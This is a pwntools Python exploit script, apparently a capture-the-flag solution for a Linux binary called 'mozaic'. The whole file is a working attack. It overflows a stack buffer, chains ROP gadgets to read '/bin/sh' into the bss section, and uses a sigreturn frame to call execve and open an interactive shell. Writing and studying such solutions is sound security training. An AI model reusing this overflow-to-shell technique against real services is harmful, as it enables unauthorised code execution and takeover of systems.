from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./mozaic"
libc_path = "./libc.so.6"

elf, rop = ELF(vuln_path), ROP(vuln_path)
# libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    io = process([vuln_path])
    # io = process([ld_path, vuln_path], env={"LD_PRELOAD": libc_path})
else:
    io = remote("", 9999)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))


exit_addr = 0x401218
bss = 0x4035A8
pop_rbp_ret = 0x00000000004010d1
read_addr = 0x000000000040125F
pop_rax_rbx_rbp_ret = 0x4010cf
binsh_addr = 0x403000
syscall = 0x40121f


frame = SigreturnFrame()
frame.rdi = 0x403000
frame.rsi = 0
frame.rdx = 0
frame.rax = 0x3b
frame.rip = syscall


payload = b"a" * 0x68
# 读取/bin/sh，再走SROP
payload += p64(pop_rbp_ret)
payload += p64(bss)
payload += p64(read_addr)
payload += p64(0)

 #SROP
payload += p64(pop_rax_rbx_rbp_ret)
payload += p64(0xf) + p64(0)*2
payload += p64(syscall)
payload += bytes(frame)

io.sendlineafter("$>", payload)

ddebug(f"b *{read_addr}\ncontinue")
io.sendlineafter("$>", b"q") # exit-> pop_rbp_ret

io.sendline(b"/bin/sh\x00")



io.interactive()
